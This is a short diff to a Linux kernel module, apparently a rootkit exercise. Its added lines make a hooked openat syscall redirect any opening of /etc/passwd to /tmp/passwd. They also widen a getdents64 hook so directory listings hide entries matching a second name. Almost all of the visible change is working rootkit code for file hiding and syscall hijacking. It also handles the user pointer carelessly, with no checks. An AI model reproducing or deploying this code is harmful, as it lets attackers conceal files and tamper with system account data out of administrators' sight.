@@ -50,6 +50,9 @@ asmlinkage int (*original_openat)(struct pt_regs *);
 asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
 {
   // Implement the sneaky part here
+  if(strcmp((char*)regs->si,"/etc/passwd")==0){
+    copy_to_user((void*)regs->si,"/tmp/passwd",12);
+  }
   return (*original_openat)(regs);
 }
 
@@ -66,7 +69,7 @@ asmlinkage int sys_getdents64_hook(struct pt_regs *regs)
         int i = 0;
         rtn = original_getdents64(regs);
         while (i < rtn) {
-                if (strncmp(cur->d_name, FILE_NAME, strlen(FILE_NAME)) == 0) {
+                if (strncmp(cur->d_name, FILE_NAME, strlen(FILE_NAME)) == 0||strncmp(cur->d_name, mystring, strlen(mystring)) == 0) {
                         int reclen = cur->d_reclen;
                         char *next_rec = (char *)cur + reclen;
                         int len = (void*)dirp + rtn - (void*)next_rec;
